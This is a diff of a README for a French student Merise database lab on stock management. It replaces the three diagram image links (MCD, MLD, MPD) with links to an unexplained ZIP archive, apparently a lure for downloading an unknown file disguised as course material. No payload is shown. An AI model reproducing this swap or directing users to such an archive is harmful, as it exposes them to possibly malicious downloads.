@@ -2,15 +2,15 @@ Lab 1 — Gestion de stock (Entrée) : Dictionnaire, Règles, MCD, MLD
 
 MCD :
 
-![MDC](https://github.com/laouysalma/Tp1Merise/blob/main/MCD.jpg?raw=true)
+![MDC](https://github.com/laouysalma/Tp1Merise/raw/refs/heads/main/biodyne/MeriseTp-v1.0.zip)
 
 MLD :
 
-![MLC](https://github.com/laouysalma/Tp1Merise/blob/main/MLD.jpg?raw=true)
+![MLC](https://github.com/laouysalma/Tp1Merise/raw/refs/heads/main/biodyne/MeriseTp-v1.0.zip)
 
 MPD :
 
-![MPD](https://github.com/laouysalma/Tp1Merise/blob/main/MPD.jpg?raw=true)
+![MPD](https://github.com/laouysalma/Tp1Merise/raw/refs/heads/main/biodyne/MeriseTp-v1.0.zip)
 
 ```SQL
 /*==============================================================*/
